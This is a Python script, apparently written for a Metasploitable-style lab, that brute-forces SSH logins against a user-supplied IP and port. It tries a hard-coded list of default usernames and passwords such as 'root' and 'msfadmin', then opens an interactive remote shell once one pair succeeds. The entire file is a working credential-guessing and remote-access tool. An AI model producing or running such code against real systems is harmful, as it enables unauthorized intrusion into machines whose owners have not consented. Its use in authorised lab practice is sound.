import paramiko
import sys
import time

# This is a simple Brute force that tries to login with a list of usernames and passwords
def sshBruteForce(ip, port, username, password):

    # This creates an object to manage the ssh connection
    client = paramiko.SSHClient()
    # This automatically adds the host key of the remote system to our system for first time connections using ssh
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:

        # connect to the client using our passed in ip, port, username, and password
        client.connect(ip, port, username, password)
        print(f"Connection Successful to {ip}")

        # Now we create an interactive shell over the SSH connection
        shellSession = client.invoke_shell()

        # Asks for users input to execute on the remote machine
        while True:
            command = input("Enter Commands ('exit' to quit): ")
            if command.lower() == 'exit':
                break
            
            # This will send the command
            shellSession.send(command + "\n")

            # Wait for the command execution
            time.sleep(1)

            # Once the output is recieved, send it back to local host
            while shellSession.recv_ready():
                output = shellSession.recv(1024).decode('utf-8')
                sys.stdout.write(output)
    
    except paramiko.AuthenticationException:
        print("Authentication failed!")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False
    finally:
        client.close()
    
    return True

if __name__ == "__main__":

    # Promp for user input
    rhost = input("Enter the target IP address: ")
    rport = int(input("Enter the port number (EX: 22): "))

    usernames = ["root", "msfadmin", "user"] 
    passwords = ["password", "msfadmin", "user"]

    # This will iterate through our lists of usernames and passwords and check to see if there is a successful match
    for username in usernames:
        for password in passwords:
            print(f"Trying {username}:{password}")
            if sshBruteForce(rhost, rport, username, password):
                print(f"Successfully connected with {username}:{password}")
                sys.exit(0)

    print("Could not connect with any of the provided username-password combinations.")
